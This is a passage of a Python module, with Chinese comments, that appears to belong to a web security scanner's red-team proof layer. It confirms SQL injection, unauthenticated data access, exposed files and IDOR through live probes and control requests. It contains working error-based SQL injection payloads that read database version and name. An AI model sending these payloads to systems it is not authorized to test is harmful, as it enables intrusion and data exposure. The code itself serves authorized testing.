"""P0 结果证明层：把「存在型」发现升级为「达成型」结论。

=====================================================================
为什么需要这一层
=====================================================================

现有引擎的判定终点是「漏洞存在」：

    `_error_based()` 注入一个单引号，看响应里有没有 SQL 报错 ——
    命中就报「SQL 注入，高危」。代码注释里写得很诚实：
    「已确证，建议用 sqlmap 复核数据规模」。

也就是说，「这个注入能不能真的读出数据」这件事，被推给了人工。

但黑客视角下，「能触发一个 SQL 报错」几乎没有价值 ——
有价值的是「能不能读出数据」。两者的差距不是程度问题，是**性质问题**：
前者是「现象」，后者是「结果」。本模块补的就是这一步。

=====================================================================
四条不可松的约束
=====================================================================

1. **证明即止**：读出数据库版本 / 当前库名，就已经证明了「数据面可达」。
   不列举表、不读取任何业务数据、不批量导出。
   —— 多读一条都是越界，且会让报告失去可复测性。

2. **必须带对照实验**：任何「读到了数据」的结论，都要有一个对照请求
   证明这个结论不是整站同码 / 边界拦截 / 兜底页面造成的。
   （这是 2026-09-21 事故反复验证过的教训，任何新判据都必须过这一关。）

3. **只读不写（L2 以下）**：本模块的证明器默认只做读操作。
   写类证明必须显式绑定 requires=["write"] 并走受控写留痕。

4. **证明失败不等于目标安全**：证明器返回三态 ——
   已达成 / 未达成 / 未能验证。条件不足时必须返回「未能验证」，
   不得因为「没测出来」就输出「未达成」。
"""

from __future__ import annotations

import json
import os
import re
import secrets
import sys
from dataclasses import dataclass, field
from typing import Any, Callable

# 允许直接 `python engine/proofs.py` 运行自测。
# 以模块方式导入时 __package__ 有值，这段不生效。
if __name__ == "__main__" and not __package__:
    sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from engine.redteam import (  # noqa: E402
    IMPACT_L1,
    IMPACT_L2,
    IMPACT_L3,
    INCONCLUSIVE,
    NOT_PROVEN,
    OBJ_MODIFY_DATA,
    OBJ_READ_DATA,
    OBJ_TAKE_CONTROL,
    PROVEN,
    AttackPath,
    AttackStep,
    StepOutcome,
    register_path,
)

# ======================================================================
# 证明结论
# ======================================================================


@dataclass
class ProofOutcome:
    """一次结果证明的结论。三态，不可混淆。"""

    proven: bool = False
    inconclusive: bool = False
    objective: str = OBJ_READ_DATA
    impact_level: str = IMPACT_L1
    detail: str = ""
    evidence: list[str] = field(default_factory=list)
    probes: int = 0
    reason: str = ""

    @property
    def state(self) -> str:
        if self.proven:
            return PROVEN
        if self.inconclusive:
            return INCONCLUSIVE
        return NOT_PROVEN

    def to_dict(self) -> dict[str, Any]:
        return {
            "state": self.state,
            "objective": self.objective,
            "impact_level": self.impact_level,
            "detail": self.detail,
            "evidence": list(self.evidence),
            "probes": self.probes,
            "reason": self.reason,
        }


# ======================================================================
# 数据可达信号（复用越权矩阵的字段判据，保持判据一致）
# ======================================================================

try:
    from engine.authz_matrix import DATA_SIGNALS
except Exception:  # noqa: BLE001
    DATA_SIGNALS = []

# 「明文暴露 PII」类发现的证明判据 —— **与检测器共用同一份规则与过滤**。
# 同类发现必须同类判据：检测器说「响应里有 PII」，证明器就得拿同一把尺子
# 去重量（含占位值 / 重复 / 字段片段过滤），否则会出现「发现说响应里有手机号、
# 证明器却因为响应不是 JSON 而判未达成」这种自相矛盾的结论。
try:
    from engine.checks.base import PII_PATTERNS, pii_hit_values  # noqa: E402
except Exception:  # noqa: BLE001
    PII_PATTERNS = {}

    def pii_hit_values(text: str, *, limit: int = 12):  # type: ignore[misc]
        return []

# 结构化数据的形态判据：光「有内容」不算数据，要有**结构**
_JSON_START = re.compile(r"^\s*[\[\{]")
_CSV_LIKE = re.compile(r"^[^\n,]+,[^\n,]+,[^\n,]+$", re.M)
_DUMP_MARK = re.compile(r"(INSERT\s+INTO|CREATE\s+TABLE|COPY\s+\w+\s+FROM)",
                        re.I)

# SQL 元信息证明用：只读版本号 / 库名，不读业务数据
_VER_IN_BODY = re.compile(r"\b\d+\.\d+\.\d+(?:[-\w.]{0,20})?\b")
_ERR_ECHO = re.compile(r"~([\w.\-]{2,60})")


def _data_signals_in(body: str) -> list[str]:
    hits = []
    for name, pat in DATA_SIGNALS:
        try:
            if pat.search(body or ""):
                hits.append(name)
        except Exception:  # noqa: BLE001
            continue
    return hits


def _looks_like_structured_data(body: str) -> tuple[bool, str]:
    """判断响应体是否真的是「数据」，而不是一个页面。

    这是「拿到数据」类结论的底线判据 —— 必须排除
    404 页、拦截页、错误页、以及只有一行的假数据。
    """
    text = (body or "").strip()
    if not text or len(text) < 40:
        return False, "内容过短，不足以构成数据集"

    if _JSON_START.match(text):
        try:
            obj = json.loads(text[:200_000])
        except Exception:  # noqa: BLE001
            obj = None
        if isinstance(obj, list) and obj:
            return True, f"JSON 数组，{len(obj)} 条记录"
        if isinstance(obj, dict):
            vals = [v for v in obj.values() if isinstance(v, list)]
            if vals and vals[0]:
                return True, f"JSON 对象，含 {len(vals[0])} 条记录的字段"
            if len(obj) >= 3:
                return True, f"JSON 对象，{len(obj)} 个字段"

    csv_rows = _CSV_LIKE.findall(text)
    if len(csv_rows) >= 5:
        return True, f"疑似 CSV，至少 {len(csv_rows)} 行、每行 ≥3 列"

    if _DUMP_MARK.search(text):
        return True, "含数据库导出语句（INSERT/CREATE TABLE）"

    return False, "内容不具数据形态（非 JSON / CSV / 导出文件）"


# ======================================================================
# 证明器注册表
# ======================================================================

# (item_id 匹配式, 目标, 影响级别, 能力依赖, 证明函数)
#
# 匹配式支持 `*` 通配（只作后缀通配，如 `WSTG-ATHZ-*`）。
#
# ⚠️ 这里**必须写白名单式的精确项 ID**，不能用 `"EXT-"` / `"CONF"` 这种
# 大前缀。曾经 `prove_unauth_data` 用了 `"EXT-"`，结果它把整个扩展清单
# 30 多项全吞了 —— 端口暴露、组件版本、安全响应头……全部被拿去证明
# 「能不能读到数据」，产出一堆「未达成」。这些结论既没意义，又会被读者
# 读成「我们试过拿数据、拿不到」。**宽前缀就是一种伪装成白名单的黑名单。**
PROVERS: list[tuple[tuple[str, ...], str, str, list[str], Callable]] = []

# ---- 匹配式分组：**唯一事实来源** ----
# 路径的「发现入口」环节和「证明」环节必须挑同一批发现，否则会出现
# 「入口在 A 类发现上、证明器却去证 B 类发现」的错配。两边引用同一份常量。
_PAT_SQL = ("WSTG-INPV-05",)
# 匿名/未授权即可取回**结构化数据**的接口类发现（注意：不含端口、组件版本、
# 响应头 —— 那些发现与「能不能读到数据」无关，套上证明只会产出无意义的结论）
#
# ⚠️ 这里**逐项列出**，不用 `WSTG-ATHZ-*` 通配。曾经用过通配，后果有两个：
#   (a) 把 ATHZ-01（目录遍历，读的是服务端文件系统）当成「匿名读到业务数据」去证；
#   (b) 把 ATHZ-04（IDOR）吞掉，让它永远走不到真正的越权判据（需两账号对照）。
#   通配写下的那一刻就等价于黑名单 —— 清单以后增项时会被静默纳入。
#
#   `WSTG-CONF-05`（管理接口暴露）已移出本组：它是「管理面」而不是「数据接口」，
#   正确的归属是 `_PAT_ADMIN`（证明拿到控制权）。留在本组会被先注册的
#   匿名数据证明器抢走，管理功能那一类结论就永远出不来。
_PAT_UNAUTH = ("WSTG-ATHZ-02", "WSTG-ATHZ-03", "WSTG-ATHZ-05",
               "EXT-DP-02", "EXT-DP-04", "EXT-DP-05")
# 「响应中明文暴露敏感数据」单列一组：它的证据形态不是结构化数据，
# 判据必须换成 PII 明文规则（见 prove_pii_in_response 的说明）。
# 曾经它被归在 _PAT_UNAUTH 里，结果是「发现说响应里有手机号、
# 证明器却因为响应不是 JSON 而判未达成」—— 结论与证据自相矛盾。
_PAT_PII = ("EXT-DP-01",)
# 文件类发现：内容是「数据 / 配置 / 凭据」而非页面。
# 目录遍历（ATHZ-01）归这里：它读的是服务端文件系统，判据与「文件内容是否
# 具备数据形态」一致，而不是「换个对象标识是否读到他人数据」。
_PAT_FILE = ("WSTG-CONF-03", "WSTG-CONF-04", "WSTG-ATHZ-01", "EXT-CD-*")
# 越权读他人数据（判据与匿名读取不同：必须有第二个账号作对照）
#
# ⚠️ 项号是 **ATHZ-04（不安全的直接对象引用）**，不是 ATHZ-01。
# 曾经写成 ATHZ-01，后果是报告里的项号与清单对不上号：
# 报告写「WSTG-ATHZ-01 越权读他人数据」，清单里该项却是「目录遍历与文件包含」。
# 复核的人按项号去核对检查项时会完全对不上，这类错配比漏报更难被发现。
# APIT-02（API 对象级授权缺陷 / BOLA）判据同源，一并纳入。
_PAT_IDOR = ("WSTG-ATHZ-04", "WSTG-APIT-02")
# ---- 「拿到控制权」的两类入口 ----
# 命令执行面：注入类原语 + 恶意文件上传 + Agent 工具权限过宽。
# 注意这里不含反射型 XSS 之类 —— 前端脚本执行不等于服务端控制权。
_PAT_EXEC = ("WSTG-INPV-08", "WSTG-INPV-11", "WSTG-INPV-12", "WSTG-INPV-18",
             "WSTG-INPV-23", "WSTG-BUSL-09", "EXT-AI-07")
# 管理功能未授权可达：认证绕过 / 默认凭据 / 弱认证 / 授权绕过 / 管理面暴露。
_PAT_ADMIN = ("WSTG-ATHN-02", "WSTG-ATHN-04", "WSTG-ATHN-07", "WSTG-ATHZ-02",
              "WSTG-CONF-05")
# ---- 「修改数据」 ----
# 服务端采信客户端提交的业务字段（写语义）的入口。
# 不含纯读类项：读得到不等于改得动，结果能力必须逐项对应。
_PAT_WRITE = ("WSTG-BUSL-01", "WSTG-BUSL-03", "WSTG-BUSL-10", "WSTG-INPV-20")


def register_prover(patterns: tuple[str, ...], objective: str,
                    impact: str = IMPACT_L2, requires: list[str] | None = None):
    def deco(fn: Callable):
        PROVERS.append((patterns, objective, impact, requires or [], fn))
        return fn
    return deco


def _match_item(item_id: str, pattern: str) -> bool:
    if pattern.endswith("*"):
        return item_id.startswith(pattern[:-1])
    return item_id == pattern


def find_prover(finding: Any) -> tuple[str, str, list[str], Callable] | None:
    """按 item_id 找证明器。

    取**最具体的匹配**：命中模式越长越优先。否则一个家族模式会先抢走
    本该属于精确模式的项 —— 例如 `WSTG-ATHZ-*`（匿名数据）会抢走
    `WSTG-ATHZ-04`（越权读他人数据），两者判据完全不同。
    （现在 `_PAT_UNAUTH` 已改成逐项列出，不再用家族通配兜底。）
    """
    item_id = str(getattr(finding, "item_id", "") or "")
    best: tuple[int, tuple[str, str, list[str], Callable]] | None = None
    for patterns, obj, impact, requires, fn in PROVERS:
        for p in patterns:
            if _match_item(item_id, p):
                score = len(p)
                if best is None or score > best[0]:
                    best = (score, (obj, impact, requires, fn))
    return best[1] if best else None


# ======================================================================
# 证明器 1：SQL 注入 → 数据面可达
# ======================================================================


def _sql_metadata_payloads(sample: str) -> list[tuple[str, str]]:
    """构造「读元信息」的最小证明载荷。

    **只取 version() / database()** —— 这两个值足以证明「数据面可达」。
    不列举表结构、不读取任何业务表 —— 多读一条就超出证明所需，
    既不必要，也会让报告失去「运维可安全复测」的性质。
    """
    s = sample or "1"
    return [
        ("mysql", f"{s}' AND extractvalue(1,concat(0x7e,version()))-- -"),
        ("mysql-db", f"{s}' AND extractvalue(1,concat(0x7e,database()))-- -"),
        ("mssql", f"{s}' AND 1=convert(int,@@version)-- -"),
        ("pgsql", f"{s}' AND 1=cast(version() as int)-- -"),
    ]


def _injection_points(ctx: Any, finding: Any = None, limit: int = 3) -> list[dict]:
    """找出可尝试的注入点。优先用已有发现的端点。"""
    pts: list[dict] = []

    ep = str(getattr(finding, "endpoint", "") or "")
    param = str(getattr(finding, "param", "") or "")
    if ep:
        if param and "?" in ep:
            pts.append({"url": ep, "param": param, "method": "GET"})
        elif param:
            sep = "&" if "?" in ep else "?"
            pts.append({"url": f"{ep}{sep}{param}=1", "param": param, "method": "GET"})

    if not pts:
        for u in (getattr(ctx, "_cache", {}) or {}).get("param_urls", []) or []:
            pts.append({"url": str(u), "param": "", "method": "GET"})

    return pts[:limit]


@register_prover(_PAT_SQL, OBJ_READ_DATA, IMPACT_L2)
def prove_sql_data_reachable(ctx: Any, finding: Any = None) -> ProofOutcome:
    """证明 SQL 注入是否真的可以读出数据。

    判据链（缺一不可）：
      ① 注入点的参数被应用真实处理过（响应随载荷变化，或出现 SQL 报错回显）
      ② 回显内容里出现**数据库版本号或库名**这类只有服务端才能提供的信息
      ③ 对照实验：随机载荷不产生同样的回显
    """
    out = ProofOutcome(objective=OBJ_READ_DATA, impact_level=IMPACT_L2)
    pts = _injection_points(ctx, finding)
    if not pts:
        out.inconclusive = True
        out.reason = "未定位到可用的注入点（缺少带参数端点或参数名）"
        return out

    from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse

    for pt in pts:
        url = pt["url"]
        try:
            parts = urlparse(url)
            q = parse_qsl(parts.query, keep_blank_values=True)
        except Exception:  # noqa: BLE001
            continue
        if not q:
            continue

        for key, val in q[:6]:
            for label, payload in _sql_metadata_payloads(val):
                u = urlunparse(parts._replace(
                    query=urlencode([(k, payload if k == key else v) for k, v in q])))
                r = ctx.raw_request("GET", u)
                out.probes += 1
                body = (r or {}).get("body", "") or ""
                status = (r or {}).get("status", 0)
                if not body:
                    continue

                echo = _ERR_ECHO.search(body)
                ver = _VER_IN_BODY.search(body)
                if echo:
                    got = echo.group(1)
                    out.proven = True
                    out.detail = (f"通过 {label} 报错回显读到服务端信息：{got[:60]}")
                    out.evidence.append(
                        f"载荷类型：{label}；状态码 {status}；"
                        f"响应回显片段：{echo.group(0)[:80]}")
                elif ver and label.startswith(("mysql-db", "pgsql", "mssql")):
                    out.proven = True
                    out.detail = f"响应中出现服务端版本信息：{ver.group(0)}"
                    out.evidence.append(
                        f"载荷类型：{label}；状态码 {status}；"
                        f"命中版本串 {ver.group(0)}")

                if out.proven:
                    # 对照实验：换个不存在的参数名，回显不应出现
                    ctrl_u = urlunparse(parts._replace(
                        query=urlencode([(k, "aiscan_control_9z") for k, _ in q])))
                    rc = ctx.raw_request("GET", ctrl_u)
                    out.probes += 1
                    ctrl_body = (rc or {}).get("body", "") or ""
                    if _ERR_ECHO.search(ctrl_body) or _VER_IN_BODY.search(ctrl_body):
                        out.proven = False
                        out.inconclusive = True
                        out.reason = ("对照请求同样出现疑似回显，"
                                      "无法排除页面固有内容，判为未能验证")
                        return out
                    out.evidence.append(
                        "对照实验：使用无效载荷时未出现同样的回显，"
                        "确认回显由注入产生")
                    return out

    # 报错型手法没回显，**不等于**数据不可达 —— 还有布尔盲注、时间盲注、
    # UNION、堆叠查询等手法没有覆盖。把「这种手法没成功」写成「未达成」，
    # 就是最经典的那类假结论。只能判「未能验证」。
    #
    # 但「未能验证」也不是终点：盲注类手法正是 sqlmap 的强项，交给它补一层。
    # 这一步把「只能交人工」变成「机器给出有依据的结论（或说清为什么没测）」。
    return _sqlmap_stage(ctx, pts)


def _sqlmap_stage(ctx: Any, pts: list[dict]) -> ProofOutcome:
    """报错型手法未命中后，用 sqlmap 做多手法交叉验证。

    三态都要落到纸面，尤其是「没测」这一态：
      - 确证注入 + 取回元信息 → 已达成（数据面可达）
      - 确证不了              → 未能验证（工具覆盖面广但不是完备判定）
      - 工具不可用 / 被档位或开关关闭 → 未能验证，且理由必须写明「没测」，
        不能与「测了没有」混为一谈。把工具缺失写成「未达成」，
        读者会理解成「试过打不通」——那是完全不同的事实。
    """
    out = ProofOutcome(objective=OBJ_READ_DATA, impact_level=IMPACT_L2)
    try:
        from engine import sqlmap_probe as smp
    except Exception as e:  # noqa: BLE001
        out.inconclusive = True
        out.reason = (f"报错型手法未取回服务端信息；外部注入工具适配层不可用"
                      f"（{type(e).__name__}），盲注类手法本次未覆盖，判为未能验证")
        return out

    plan = smp.plan_for(ctx)
    if not plan.enabled:
        out.inconclusive = True
        out.reason = ("已尝试报错型元信息读取，未取回服务端信息；"
                      "盲注 / UNION / 堆叠查询类手法需 sqlmap 覆盖，"
                      f"而本次**未执行**（{plan.reason}）。"
                      "这是「没测」，不是「打不穿」——不能据此判定数据不可达。")
        return out

    res = smp.prove_points(ctx, pts, runner=getattr(ctx, "sqlmap_runner", None))
    out.probes = max(1, res.probes)
    if res.proven:
        props = "、".join(res.techniques) if res.techniques else "（未标注手法）"
        out.proven = True
        out.detail = (f"sqlmap 多手法交叉验证确证注入成立（{props}），"
                      f"并取回后端数据库信息（{res.dbms or '未识别'}）——"
                      "服务端才能提供的信息，证明数据面可达")
        out.evidence = res.evidence_lines()
        out.evidence.append("说明：本次仅取回数据库版本等元信息用于证明可达，"
                            "未导出任何业务数据")
        return out

    out.inconclusive = True
    out.reason = (f"报错型手法未取回服务端信息；sqlmap 多手法交叉验证亦未确证注入"
                  f"（{res.reason}）。sqlmap 覆盖面广但**不是完备判定**，"
                  "且未覆盖自定义编码 / JSON body / 非常规参数位置，"
                  "因此不能据此判定数据不可达，判为未能验证。")
    return out


# ======================================================================
# 证明器 2：未授权接口 → 真实数据可达
# ======================================================================


@register_prover(_PAT_UNAUTH, OBJ_READ_DATA, IMPACT_L1)
def prove_unauth_data(ctx: Any, finding: Any = None) -> ProofOutcome:
    """匿名（无任何凭据）请求接口，判断响应里是否真有业务数据。

    与「接口返回 200」完全不同 —— 200 可能只是个空壳或错误页。
    这里要求响应体具备**数据结构**且含**业务字段**。
    """
    out = ProofOutcome(objective=OBJ_READ_DATA, impact_level=IMPACT_L1)
    ep = str(getattr(finding, "endpoint", "") or "")
    if not ep:
        out.inconclusive = True
        out.reason = "该发现未记录可复测的端点"
        return out

    r = ctx.raw_request("GET", ep)
    out.probes += 1
    status = (r or {}).get("status", 0)
    body = (r or {}).get("body", "") or ""

    if status != 200:
        out.reason = f"匿名请求返回 {status}，未取得数据"
        return out
    if not body:
        out.reason = "匿名请求返回空响应体"
        return out

    # 对照：随机不存在路径 —— 排除整站同码 / 兜底页
    try:
        import secrets as _s
        ctrl = ctx.raw_request("GET", f"{ctx.target_url}/_aiscan_{_s.token_hex(6)}")
        out.probes += 1
        ctrl_body = (ctrl or {}).get("body", "") or ""
        if ctrl_body and _norm(body) == _norm(ctrl_body):
            out.inconclusive = True
            out.reason = ("随机路径返回与目标端点相同的内容，"
                          "无法区分是真实数据还是站点兜底页，判为未能验证")
            return out
    except Exception:  # noqa: BLE001
        pass

    ok, why = _looks_like_structured_data(body)
    sigs = _data_signals_in(body)
    if ok and sigs:
        out.proven = True
        out.detail = f"匿名请求直接取回业务数据：{why}；命中字段 {('、'.join(sigs))}"
        out.evidence.append(f"端点 {ep} 匿名可访问，状态码 200")
        out.evidence.append(f"数据结构判据：{why}")
        out.evidence.append(f"业务字段命中：{'、'.join(sigs)}")
        return out
    if ok and not sigs:
        out.inconclusive = True
        out.reason = (f"响应具备数据形态（{why}），但未命中业务字段判据，"
                      "无法确认是否为敏感业务数据")
        return out

    out.reason = f"响应不具数据形态（{why}）"
    return out


def _norm(text: str) -> str:
    """归一化易变标识后比较 —— 直接字节比较会因为 traceid / 时间戳永远不等。"""
    try:
        from engine.wafgate import _normalize_for_compare
        return _normalize_for_compare(text)
    except Exception:  # noqa: BLE001
        return re.sub(r"\s+", " ", (text or "")[:4000])


def _finding_text(finding: Any) -> str:
    """把一个发现的全部文本字段拼起来，用于判断它声称的是什么。

    用途：同一个 item_id 下可能挂着形态完全不同的发现（例如 EXT-DP-01 下
    既有「响应中明文暴露手机号」也有「前端产物里残留云密钥」）。证明器必须
    先看清发现**自己声称的是什么**，再决定判据是否适用 —— 否则会拿 PII 判据
    去量一个密钥泄露的发现，得出「未复现 PII」这种无关且误导的结论。
    """
    parts = [
        str(getattr(finding, "title", "") or ""),
        str(getattr(finding, "description", "") or ""),
        str(getattr(finding, "technical_detail", "") or ""),
        str(getattr(finding, "impact", "") or ""),
    ]
    for ev in (getattr(finding, "evidence", None) or []):
        parts.append(str(getattr(ev, "content", "") or ""))
        parts.append(str(getattr(ev, "note", "") or ""))
        if isinstance(ev, dict):
            parts.append(str(ev.get("content", "")))
            parts.append(str(ev.get("note", "")))
    return "\n".join(parts)


# ======================================================================
# 证明器 2b：响应中明文暴露 PII → 数据确实能被匿名读到
# ======================================================================


@register_prover(_PAT_PII, OBJ_READ_DATA, IMPACT_L1)
def prove_pii_in_response(ctx: Any, finding: Any = None) -> ProofOutcome:
    """匿名重取该响应，确认里面**真的有 PII 明文**。

    为什么不复用 `prove_unauth_data`：那条证明器的判据是「响应是结构化数据
    （JSON / CSV / 导出文件）」。而「响应中明文暴露敏感数据」这类发现的证据
    形态恰恰**不是**结构化数据 —— 用错判据会得出「响应不具数据形态 → 未达成」，
    与发现自身的证据（响应里就有手机号）直接矛盾。同类发现必须同类判据：
    这里复用检测器用的 `PII_PATTERNS`，让「发现」与「证明」用同一把尺子。

    证据里**只写命中的规则名，绝不回写原始 PII 值**。
    """
    out = ProofOutcome(objective=OBJ_READ_DATA, impact_level=IMPACT_L1)
    ep = str(getattr(finding, "endpoint", "") or "")
    if not ep:
        out.inconclusive = True
        out.reason = "该发现未记录可复测的端点"
        return out

    # 先确认该发现声称的是不是「PII 明文」。同一 item_id 下可能挂着别的形态
    # （例如前端产物里残留的云密钥 / 内网地址）—— 对它们用 PII 判据只会产出
    # 「未复现 PII」这种无关结论，属于典型的判据错配。
    claimed = [name for name in (PII_PATTERNS or {}) if name in _finding_text(finding)]
    if not claimed:
        out.inconclusive = True
        out.reason = ("该发现声称的敏感信息类型不属 PII 明文（可能是密钥 / "
                      "内网地址等），本证明器判据不适用 —— 需专用证明器，"
                      "不能据此判定数据不可达")
        return out

    r = ctx.raw_request("GET", ep)
    out.probes += 1
    status = (r or {}).get("status", 0)
    body = (r or {}).get("body", "") or ""

    if status != 200 or not body:
        # ⚠️ 重取失败**绝不能**判「未达成」。PII 暴露往往依赖特定参数 /
        # 特定会话 / 特定权限；一次匿名重取没拿到，说明的是「这次没取到」，
        # 不是「目标不可达」。判「未达成」会被读成「我们试过、拿不到」。
        out.inconclusive = True
        out.reason = (f"匿名重取返回 {status or '无响应'}，"
                      "无法复核响应内容，判为未能验证")
        return out

    # 对照：随机不存在路径 —— 排除「整站同一张兜底页里恰好有示例手机号」
    try:
        import secrets as _s
        ctrl = ctx.raw_request("GET", f"{ctx.target_url}/_aiscan_{_s.token_hex(6)}")
        out.probes += 1
        ctrl_body = (ctrl or {}).get("body", "") or ""
        if ctrl_body and _norm(body) == _norm(ctrl_body):
            out.inconclusive = True
            out.reason = ("随机路径返回与目标端点相同的内容，无法区分真实暴露"
                          "与站点兜底页，判为未能验证")
            return out
    except Exception:  # noqa: BLE001
        pass

    # 用与检测器**完全同一份**过滤规则统计命中类型（占位值 / 重复 / 字段片段
    # 内的占位词都会被剔除）。各写一份会漂移，漂移的后果是证据里的类型与
    # 检测器报的类型对不上 —— 读者会认为其中一份是错的。
    _hits = pii_hit_values(body, limit=12)
    hits = [name for name, _v in _hits]
    if not hits:
        # 发现声称有 PII、本次重取却没有 —— 这是**记录不一致**：
        # 既不能判「已达成」（没复现出来），也不能判「未达成」
        # （没复现不等于不存在）。如实标「未能验证」并指明需人工复核。
        out.inconclusive = True
        out.reason = (f"本次匿名重取未复现出 {'/'.join(claimed)}（发现声称存在）"
                      "—— 属记录不一致，需人工复核；不能据此判定数据不可达")
        return out

    out.proven = True
    out.detail = f"匿名响应中确认存在 PII 明文，命中规则：{'、'.join(hits)}"
    out.evidence.append(f"端点 {ep} 匿名可访问，状态码 200")
    out.evidence.append(f"PII 判据命中：{'、'.join(hits)}"
                        "（仅记录规则名，不回写原始值）")
    out.evidence.append("对照实验：随机路径内容与该响应不同，排除整站兜底页")
    return out


# ======================================================================
# 证明器 3：文件暴露 → 内容真的是数据
# ======================================================================


@register_prover(_PAT_FILE, OBJ_READ_DATA, IMPACT_L1)
def prove_file_is_data(ctx: Any, finding: Any = None) -> ProofOutcome:
    """对「敏感文件 / 备份文件可访问」类发现，验证内容真的是数据。

    现状的判据只是「这个路径返回了 200」—— 但 200 可能是：
      - 一个 404 页面（很多站点对错误返回 200）
      - 一张边界拦截页
      - 一个空文件
    三种情况被当成「敏感文件泄露」都是误报。
    """
    out = ProofOutcome(objective=OBJ_READ_DATA, impact_level=IMPACT_L1)
    ep = str(getattr(finding, "endpoint", "") or "")
    if not ep:
        out.inconclusive = True
        out.reason = "该发现未记录可复测的端点"
        return out

    r = ctx.raw_request("GET", ep)
    out.probes += 1
    status = (r or {}).get("status", 0)
    body = (r or {}).get("body", "") or ""

    if status != 200:
        out.reason = f"重新请求返回 {status}，未取得文件内容"
        return out
    if not body:
        out.reason = "返回内容为空"
        return out

    # 排除边界拦截页：拦截页也有内容，但它不是目标的数据
    try:
        from engine.wafgate import detect_block_page
        hit, vendor, _ = detect_block_page(status, (r or {}).get("headers") or {}, body, [])
        if hit:
            out.inconclusive = True
            out.reason = (f"返回内容是 {vendor} 的边界拦截页，"
                          "不是目标文件内容，判为未能验证")
            return out
    except Exception:  # noqa: BLE001
        pass

    ok, why = _looks_like_structured_data(body)
    if ok:
        out.proven = True
        out.detail = f"文件内容确为数据：{why}（{len(body)} 字节）"
        out.evidence.append(f"端点 {ep} 返回 200，内容形态：{why}")
        out.evidence.append(f"内容片段（脱敏前 200 字符）：{body[:200]}")
        return out

    out.reason = f"文件内容不具数据形态（{why}），不构成数据泄露"
    return out


# ======================================================================
# 证明器 4：越权访问 → 读到的是他人数据
# ======================================================================


@register_prover(_PAT_IDOR, OBJ_READ_DATA, IMPACT_L2, requires=["accounts"])
def prove_idor_reads_others(ctx: Any, finding: Any = None) -> ProofOutcome:
    """证明越权访问读到的是**他人的真实数据**，而不是空壳或自己的数据。

    必须两个账号：A 的凭据 + B 的资源标识。
    只有单账号时判「未能验证」—— 无法区分「越权读到他人数据」
    与「正常读到自己数据」。
    """
    out = ProofOutcome(objective=OBJ_READ_DATA, impact_level=IMPACT_L2)
    accounts = getattr(ctx, "accounts", None) or []
    if len(accounts) < 2:
        out.inconclusive = True
        out.reason = ("越权证明需要至少两个已授权测试账号（当前 "
                      f"{len(accounts)} 个），无法区分「读到他人数据」"
                      "与「读到自己数据」")
        return out

    ep = str(getattr(finding, "endpoint", "") or "")
    if not ep:
        out.inconclusive = True
        out.reason = "该发现未记录可复测的端点"
        return out

    a, b = accounts[0], accounts[1]
    ra = _fetch_with(ctx, ep, a)
    rb = _fetch_with(ctx, ep, b)
    out.probes += 2

    if (ra or {}).get("status") != 200 or (rb or {}).get("status") != 200:
        out.reason = (f"两个账号请求状态码分别为 "
                      f"{(ra or {}).get('status')} / {(rb or {}).get('status')}，"
                      "未同时取得数据")
        return out

    body_a = (ra or {}).get("body", "") or ""
    body_b = (rb or {}).get("body", "") or ""
    sigs = _data_signals_in(body_a)
    ok, why = _looks_like_structured_data(body_a)

    if not ok or not sigs:
        out.reason = f"账号 A 取回的内容不构成业务数据（{why}）"
        return out
    if _norm(body_a) == _norm(body_b):
        out.inconclusive = True
        out.reason = ("两个账号取回完全相同的内容，"
                      "无法排除是公共数据或兜底页，判为未能验证")
        return out

    out.proven = True
    out.detail = (f"账号 {a.get('name', 'A')} 的凭据可访问该端点并取回业务数据"
                  f"（{why}，命中字段 {'、'.join(sigs)}），"
                  f"且与账号 {b.get('name', 'B')} 所见内容不同")
    out.evidence.append(f"端点 {ep}：两账号均可访问且返回不同数据")
    out.evidence.append(f"数据形态：{why}；业务字段：{'、'.join(sigs)}")
    return out


def _fetch_with(ctx: Any, url: str, account: dict) -> dict:
    """用指定账号凭据请求（只读）。"""
    import requests

    try:
        r = requests.get(
            url,
            headers={**dict(getattr(ctx.client, "session", None).headers
                            if getattr(ctx, "client", None) else {}),
                     **(account.get("headers") or {})},
            cookies=account.get("cookies") or None,
            timeout=getattr(ctx.client, "timeout", 12) if getattr(ctx, "client", None) else 12,
            verify=False, allow_redirects=True,
        )
        return {"status": r.status_code, "body": (r.text or "")[:50_000]}
    except Exception as e:  # noqa: BLE001
        return {"status": 0, "body": "", "error": f"{type(e).__name__}: {str(e)[:80]}"}


# ======================================================================
# 攻击路径注册（供红队模式编排）
# ======================================================================

# 合规模式跑完后，把逐项结论注入 ctx，用于区分「未达成」与「未能验证」
_STATE_OK, _STATE_FAIL, _STATE_MANUAL = "通过", "不通过", "待人工执行"


def _item_state(ctx: Any, item_id: str) -> str:
    return str((getattr(ctx, "_cache", {}) or {}).get(
        "item_states", {}).get(item_id, "") or "")


def _findings_for(ctx: Any, patterns: tuple[str, ...]) -> list[Any]:
    out = []
    for f in (getattr(ctx, "findings", None) or []):
        iid = str(getattr(f, "item_id", "") or "")
        if any(_match_item(iid, p) for p in patterns):
            out.append(f)
    return out


def _lead_step(step_id: str, name: str, objective: str, prefixes: tuple[str, ...],
               item_id_for_state: str = "", requires: list[str] | None = None,
               impact: str = IMPACT_L1) -> AttackStep:
    """路径的第一环：「发现可深入的入口」。

    这一步**必须绑定执行体**。曾经它是一个不绑执行体的占位步骤，后果是：
    `_run_path()` 在第一环就停住（结果记「未执行（该步骤未绑定执行体）」），
    后面真正做证明的那一步**永远得不到执行机会**。报告于是出现自相矛盾 ——
    结果证明层已经实测证明读到了数据，攻击目标那一栏却写「未能验证」。

    也就是说：占位步骤不是「无害的装饰」，它会把整条路径短路掉。
    这是模型里「A 的输出 = B 的输入」的 A —— A 拿不到线索，B 无从谈起。
    """

    def _run(ctx: Any) -> StepOutcome:
        so = StepOutcome(step_id=step_id, name=name, impact=impact)
        fs = _findings_for(ctx, prefixes)
        if fs:
            so.result = PROVEN
            f0 = fs[0]
            so.detail = (f"发现 {len(fs)} 条可深入的可疑入口，"
                         f"最前一条：{getattr(f0, 'title', '')}")
            so.evidence.append(
                f"{getattr(f0, 'item_id', '')} @ "
                f"{getattr(f0, 'endpoint', '') or '（无端点）'}")
            return so
        # 没有线索：要看对应检查项到底跑没跑过。
        # 跑过且判「通过」= 明确的失败证据；没跑 = 条件不足，只能说「没能验证」。
        st = _item_state(ctx, item_id_for_state) if item_id_for_state else ""
        if st == _STATE_OK:
            so.result = NOT_PROVEN
